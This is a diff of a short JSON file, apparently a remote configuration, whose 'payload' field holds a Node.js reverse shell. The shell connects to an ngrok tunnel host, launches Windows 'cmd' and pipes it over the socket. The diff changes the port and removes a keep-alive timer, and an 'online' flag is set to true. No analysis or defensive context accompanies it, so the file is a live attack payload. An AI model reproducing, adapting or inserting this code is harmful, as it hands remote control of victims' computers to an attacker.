@@ -1,4 +1,4 @@
 {
-  "payload": "const net = require('net'); const { exec } = require('child_process');const SERVER_HOST = '0.tcp.sa.ngrok.io'; const SERVER_PORT = 17202; const socket = net.createConnection({ host: SERVER_HOST, port: SERVER_PORT }, () => { console.log('Conexão estabelecida com o servidor.'); const shell = exec('cmd'); shell.stdout.pipe(socket); shell.stderr.pipe(socket); socket.pipe(shell.stdin); setInterval(() => { socket.write('echo Keep-alive\n'); }, 5 * 60 * 1000); }); socket.on('error', (err) => { console.error('Erro de conexão:', err); });",
+  "payload": "const net = require('net'); const { exec } = require('child_process');const SERVER_HOST = '0.tcp.sa.ngrok.io'; const SERVER_PORT = 10652; const socket = net.createConnection({ host: SERVER_HOST, port: SERVER_PORT }, () => { console.log('Conexão estabelecida com o servidor.'); const shell = exec('cmd'); shell.stdout.pipe(socket); shell.stderr.pipe(socket); socket.pipe(shell.stdin); }); socket.on('error', (err) => { console.error('Erro de conexão:', err); });",
   "online": true
 }
